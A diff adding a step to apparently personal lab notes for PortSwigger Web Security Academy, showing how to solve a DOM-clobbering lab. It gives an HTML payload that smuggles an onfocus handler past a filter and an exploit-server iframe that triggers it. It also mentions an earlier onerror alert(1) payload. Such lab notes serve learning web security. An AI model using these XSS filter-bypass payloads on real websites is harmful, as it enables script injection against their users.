@@ -80,3 +80,14 @@ If u find any of the above things in the source code of the website then there i
     then we've mentioned that onerror which means if not found then return output as alert(1) and then we have mentioned // to comment out the rest of the code and lab is solved.
 
 -----------------------------------------------------------------------------------------------------------------------------------
+
+#7 Lab: Clobbering DOM attributes to bypass HTML filters
+ 
+    1. In comment section of any post enter the payload given below
+       <form id=x tabindex=0 onfocus=print(2)><input id=attributes>
+    2. In the url append #x to check whether the payload is working or not .
+    3. Then go to exploit server and add the following payload,
+       <iframe src="https://web-id.web-security-academy.net/post?postId=2" onload="setTimeout(()=>this.src=this.src+'#x',500)">
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
